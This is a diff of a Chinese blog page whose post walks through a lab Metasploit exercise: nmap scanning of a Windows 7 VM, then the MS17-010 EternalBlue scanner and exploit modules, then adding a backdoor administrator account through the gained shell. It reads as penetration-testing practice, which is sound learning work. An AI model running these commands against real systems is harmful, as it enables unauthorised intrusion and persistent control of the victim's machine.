@@ -19,27 +19,27 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="前言书到用时方恨少，还是要勤加练习才能应对各种比赛。 渗透测试环境准备准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。 win7要打开网络共享  看到上面这样子，就是成功了 之后这台虚拟机就可以不用理它了，开着就好. 开始入侵1首先更新一下metasploit msfupdate 注意，最新版本的metasploit会提示msfupdate is no longer">
+    <meta name="description" content="前言 渗透测试环境准备 开始入侵 信息收集—扫描局域网内的机器ip地址 使用meatsploit攻击 通过Shell 对靶机进行控制      前言书到用时方恨少，还是要勤加练习才能应对各种比赛。 渗透测试环境准备准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。 win7要打开网络共享  看到上面这样子，就是成功了 之后这台虚拟机就可以不用理它了，开着就好. 开">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Metasploit 渗透练习">
 <meta property="og:url" content="https://yinwc.github.io/2018/09/29/msf/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前言书到用时方恨少，还是要勤加练习才能应对各种比赛。 渗透测试环境准备准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。 win7要打开网络共享  看到上面这样子，就是成功了 之后这台虚拟机就可以不用理它了，开着就好. 开始入侵1首先更新一下metasploit msfupdate 注意，最新版本的metasploit会提示msfupdate is no longer">
+<meta property="og:description" content="前言 渗透测试环境准备 开始入侵 信息收集—扫描局域网内的机器ip地址 使用meatsploit攻击 通过Shell 对靶机进行控制      前言书到用时方恨少，还是要勤加练习才能应对各种比赛。 渗透测试环境准备准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。 win7要打开网络共享  看到上面这样子，就是成功了 之后这台虚拟机就可以不用理它了，开着就好. 开">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yinwc.github.io/1.png">
-<meta property="og:image" content="https://yinwc.github.io/2.png">
-<meta property="og:image" content="https://yinwc.github.io/3.png">
-<meta property="og:image" content="https://yinwc.github.io/4.png">
-<meta property="og:image" content="https://yinwc.github.io/5.png">
-<meta property="og:image" content="https://yinwc.github.io/6.png">
-<meta property="og:image" content="https://yinwc.github.io/7.png">
-<meta property="og:image" content="https://yinwc.github.io/8.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/1.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/2.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/3.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/4.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/5.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/6.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/7.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/09/29/msf/8.png">
 <meta property="article:published_time" content="2018-09-29T11:30:30.000Z">
-<meta property="article:modified_time" content="2023-01-29T02:50:57.752Z">
+<meta property="article:modified_time" content="2023-02-02T06:06:55.692Z">
 <meta property="article:author" content="Y1ZkRA">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yinwc.github.io/1.png">
+<meta name="twitter:image" content="https://yinwc.github.io/2018/09/29/msf/1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/ywc.ico">
@@ -344,7 +344,7 @@
                 <!-- 文章字数统计 -->
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">594</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                        <span>Word count: <span class="post-count word-count">639</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -505,13 +505,27 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书到用时方恨少，还是要勤加练习才能应对各种比赛。</p>
+        <!-- TOC -->
+
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">渗透测试环境准备</a></li>
+<li><a href="#%E5%BC%80%E5%A7%8B%E5%85%A5%E4%BE%B5">开始入侵</a><ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86---%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E6%9C%BA%E5%99%A8ip%E5%9C%B0%E5%9D%80">信息收集—扫描局域网内的机器ip地址</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8meatsploit%E6%94%BB%E5%87%BB">使用meatsploit攻击</a></li>
+<li><a href="#%E9%80%9A%E8%BF%87shell-%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%8E%A7%E5%88%B6">通过Shell 对靶机进行控制</a></li>
+</ul>
+</li>
+</ul>
+<!-- /TOC -->
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书到用时方恨少，还是要勤加练习才能应对各种比赛。</p>
 <h2 id="渗透测试环境准备"><a href="#渗透测试环境准备" class="headerlink" title="渗透测试环境准备"></a>渗透测试环境准备</h2><p>准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。</p>
 <p>win7要打开网络共享</p>
-<p><img src="/1.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/1.png" alt="msf"></p>
 <p>看到上面这样子，就是成功了</p>
 <p>之后这台虚拟机就可以不用理它了，开着就好.</p>
-<h2 id="开始入侵1"><a href="#开始入侵1" class="headerlink" title="开始入侵1"></a>开始入侵1</h2><p>首先更新一下metasploit</p>
+<h2 id="开始入侵"><a href="#开始入侵" class="headerlink" title="开始入侵"></a>开始入侵</h2><p>首先更新一下metasploit</p>
 <p><font color="red">msfupdate</font></p>
 <p>注意，最新版本的metasploit会提示<br><strong>msfupdate is no longer supported when Metasploit is part of the operating system. Please use ‘apt update; apt install metasploit-framework’</strong></p>
 <p>输入<font color="red">apt update &amp;&amp; apt install metasploit-framework</font> 更新系统。</p>
@@ -519,21 +533,21 @@
 <p>扫描存活主机：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.31.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/2.png" alt="msf"></p>
 <p>发现使用vmware开的windows7虚拟机的ip地址</p>
 <p>扫描该主机存活端口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.181 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/3.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/3.png" alt="msf"></p>
 <p>发现开放445端口，OK，可以利用永恒之蓝漏洞进行攻击。</p>
 <h3 id="使用meatsploit攻击"><a href="#使用meatsploit攻击" class="headerlink" title="使用meatsploit攻击"></a>使用meatsploit攻击</h3><ul>
 <li>登录kali,启动meatsploit: <font color="red">msfconsole</font></li>
 </ul>
-<p><img src="/4.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/4.png" alt="msf"></p>
 <ul>
 <li>搜索永恒之蓝模块：<font color="red">search ms17-010</font></li>
 </ul>
-<p><img src="/5.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/5.png" alt="msf"></p>
 <p>这里可以得到两个工具，其中<code>auxiliary/scanner/smb/smb_ms17_010</code>是永恒之蓝扫描模块, <code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击模块，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
 <ul>
 <li>使用检测模块：<font color="red">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 </font></li>
@@ -546,7 +560,7 @@
 </li>
 </ul>
 <p>显示<strong>Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)</strong> 证明可以使用永恒之蓝进行攻击。</p>
-<p><img src="/6.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/6.png" alt="msf"></p>
 <ul>
 <li><p>使用攻击模块：<font color="red">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</font>  </p>
 </li>
@@ -557,8 +571,8 @@
 <li><p>执行攻击 <font color="red">exploit</font></p>
 </li>
 </ul>
-<p><img src="/7.png" alt="msf"></p>
-<p><img src="/8.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/7.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/8.png" alt="msf"></p>
 <p>如图可见，攻击成功，之后就可以通过Shell对目标机进行控制。</p>
 <h3 id="通过Shell-对靶机进行控制"><a href="#通过Shell-对靶机进行控制" class="headerlink" title="通过Shell 对靶机进行控制"></a>通过Shell 对靶机进行控制</h3><p>创建用户名密码 blue&#x2F;blue <code>net user blue blue /add </code></p>
 <p>将用户blue添加入管理组  <code>net localgroup administrators blue /add </code></p>
@@ -572,7 +586,7 @@
             <p>Author：<a href="https://yinwc.github.io">Y1ZkRA</a>
             <p>Link：<a href="https://yinwc.github.io/2018/09/29/msf/">https://yinwc.github.io/2018/09/29/msf/</a>
             <p>Publish date：<a href="https://yinwc.github.io/2018/09/29/msf/">September 29th 2018, 7:30:30 pm</a>
-            <p>Update date：<a href="https://yinwc.github.io/2018/09/29/msf/">January 29th 2023, 10:50:57 am</a>
+            <p>Update date：<a href="https://yinwc.github.io/2018/09/29/msf/">February 2nd 2023, 2:06:55 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -727,7 +741,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">渗透测试环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%85%A5%E4%BE%B51"><span class="toc-number">3.</span> <span class="toc-text">开始入侵1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E6%9C%BA%E5%99%A8ip%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集—扫描局域网内的机器ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8meatsploit%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">使用meatsploit攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Shell-%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%8E%A7%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">通过Shell 对靶机进行控制</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">渗透测试环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%85%A5%E4%BE%B5"><span class="toc-number">3.</span> <span class="toc-text">开始入侵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E6%9C%BA%E5%99%A8ip%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集—扫描局域网内的机器ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8meatsploit%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">使用meatsploit攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Shell-%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%8E%A7%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">通过Shell 对靶机进行控制</span></a></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1356,24 +1370,7 @@
         
         
         
-        
-        
-        
-        
-        
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
@@ -2764,7 +2761,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 124
+        Total : 123
         </div>
         <!-- search  -->
         
@@ -3070,12 +3067,6 @@
         <li class="archive-post-item">
             <span class="archive-post-date">07/06</span>
             <a class="archive-post-title" href="/2019/07/06/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Django学习笔记</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/18</span>
-            <a class="archive-post-title" href="/2019/06/18/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">App渗透测试</a>
         </li>
     
         
@@ -3585,11 +3576,6 @@
                 安全评估
             </span>
         
-            <span class="sidebar-tag-name" data-tags="渗透测试">
-                <span class="iconfont-archer">&#xe606;</span>
-                渗透测试
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="安全开发">
                 <span class="iconfont-archer">&#xe606;</span>
                 安全开发
@@ -3603,6 +3589,11 @@
             <span class="sidebar-tag-name" data-tags="problem">
                 <span class="iconfont-archer">&#xe606;</span>
                 problem
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="渗透测试">
+                <span class="iconfont-archer">&#xe606;</span>
+                渗透测试
             </span>
         
             <span class="sidebar-tag-name" data-tags="Crypto">
